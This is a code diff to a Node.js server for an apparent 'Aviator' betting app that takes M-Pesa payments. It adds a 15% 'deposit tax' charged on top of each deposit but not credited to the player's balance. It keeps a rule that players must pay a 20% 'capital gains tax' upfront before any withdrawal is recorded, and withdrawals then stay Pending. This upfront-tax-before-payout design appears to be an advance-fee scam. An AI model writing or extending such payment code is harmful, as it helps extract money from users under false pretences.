@@ -48,7 +48,7 @@ const depositSchema = new mongoose.Schema({
     phone: { type: String, required: true },
     amount: { type: Number, required: true },
     reference: { type: String, required: true },
-    status: { type: String, default: "Pending" },
+    status: { type: String, default: "Pending" }, // Transitions to "Successful" or "Failed"
     createdAt: { type: Date, default: Date.now }
 });
 const Deposit = mongoose.model('Deposit', depositSchema);
@@ -58,7 +58,7 @@ const taxPaymentSchema = new mongoose.Schema({
     phone: { type: String, required: true },
     amount: { type: Number, required: true },
     reference: { type: String, required: true },
-    status: { type: String, default: "Pending" },
+    status: { type: String, default: "Pending" }, // Transitions to "Successful" or "Failed"
     createdAt: { type: Date, default: Date.now }
 });
 const TaxPayment = mongoose.model('TaxPayment', taxPaymentSchema);
@@ -122,10 +122,14 @@ app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
         const depositAmount = Number(req.body.amount);
         if (!depositAmount || depositAmount < 500) return res.status(400).json({ message: "Minimum deposit is 500 KES." });
 
-        const totalAmountToPay = depositAmount + 15; // ModePay fee
+        // Calculate 15% deposit tax
+        const depositTax = Math.ceil(depositAmount * 0.15); 
+        const totalAmountToPay = depositAmount + depositTax; 
+
         const reference = `DEP_${Date.now()}`;
         const formattedPhone = formatPhoneNumber(req.user.phone);
 
+        // We only save the actual deposit amount (money to be added to balance)
         const newDeposit = new Deposit({ userPhone: req.user.phone, phone: formattedPhone, amount: depositAmount, reference });
         await newDeposit.save();
 
@@ -135,7 +139,7 @@ app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
             body: JSON.stringify({
                 account_id: Number(MODEPAY_ACCOUNT_ID),
                 phone: formattedPhone,
-                amount: totalAmountToPay,
+                amount: totalAmountToPay, // Request base + 15% tax from their M-Pesa
                 reference: reference
             })
         });
@@ -164,7 +168,7 @@ async function checkModePayStatus(reference) {
         const data = await response.json();
         const status = (data.status || data.ResultCode || "").toString().toUpperCase();
         
-        if (status === "SUCCESS" || status === "COMPLETED" || status === "0") return "COMPLETED";
+        if (status === "SUCCESS" || status === "COMPLETED" || status === "0") return "SUCCESSFUL";
         if (status === "FAILED" || status === "CANCELLED") return "FAILED";
         return "PENDING";
     } catch (e) {
@@ -181,13 +185,14 @@ app.get('/api/deposit/status/:reference', authenticateToken, async (req, res) =>
 
         const gatewayStatus = await checkModePayStatus(deposit.reference);
 
-        if (gatewayStatus === "COMPLETED") {
-            deposit.status = "Completed";
+        if (gatewayStatus === "SUCCESSFUL") {
+            deposit.status = "Successful";
             await deposit.save();
             
             const user = await User.findOne({ phone: deposit.userPhone });
             if (user) {
-                user.balance += deposit.amount;
+                // Adds only the base money without the 15% tax
+                user.balance += deposit.amount; 
                 await user.save();
                 io.emit("balanceUpdated", { userPhone: user.phone, newBalance: user.balance });
             }
@@ -208,7 +213,7 @@ app.post('/api/tax/stkpush', authenticateToken, async (req, res) => {
             return res.status(400).json({ message: "Minimum withdrawal is 4000 KES." });
         }
 
-        // Calculate 20% Tax (Updated from 15%)
+        // Calculate 20% Tax
         const taxAmount = Math.ceil(requestedWithdrawal * 0.20);
         const formattedPhone = formatPhoneNumber(req.body.phone || req.user.phone);
         const reference = `TAX_${Date.now()}`;
@@ -247,8 +252,8 @@ app.get('/api/tax/status/:reference', authenticateToken, async (req, res) => {
 
         const gatewayStatus = await checkModePayStatus(tax.reference);
 
-        if (gatewayStatus === "COMPLETED") {
-            tax.status = "Completed";
+        if (gatewayStatus === "SUCCESSFUL") {
+            tax.status = "Successful";
             await tax.save();
         } else if (gatewayStatus === "FAILED") {
             tax.status = "Failed";
@@ -336,14 +341,14 @@ io.on("connection", (socket) => {
             const taxPayment = await TaxPayment.findOne({ 
                 reference: taxReference, 
                 userPhone: user.phone, 
-                status: "Completed" 
+                status: "Successful" 
             });
 
             if (!taxPayment) {
                 return socket.emit("withdrawalError", { message: "Capital gains tax not paid, still pending, or already used." });
             }
 
-            // 4. SECURITY CHECK: Ensure the tax paid matches 20% of THIS withdrawal request (Updated from 15%)
+            // 4. SECURITY CHECK: Ensure the tax paid matches 20% of THIS withdrawal request
             const requiredTax = Math.ceil(amount * 0.20);
             if (taxPayment.amount < requiredTax) {
                 return socket.emit("withdrawalError", { message: "The tax paid is insufficient for this withdrawal amount. 20% tax required." });
@@ -357,7 +362,7 @@ io.on("connection", (socket) => {
             taxPayment.status = "Used";
             await taxPayment.save();
 
-            // 7. Save the final withdrawal to history (Status starts as Pending or Completed based on integration flow)
+            // 7. Save the final withdrawal to history
             const withdrawal = new Withdrawal({ userPhone: user.phone, phone, amount, status: "Pending" });
             await withdrawal.save();
 
@@ -377,4 +382,4 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 Aviator Server running on port ${PORT}`);
 });
-        
+    
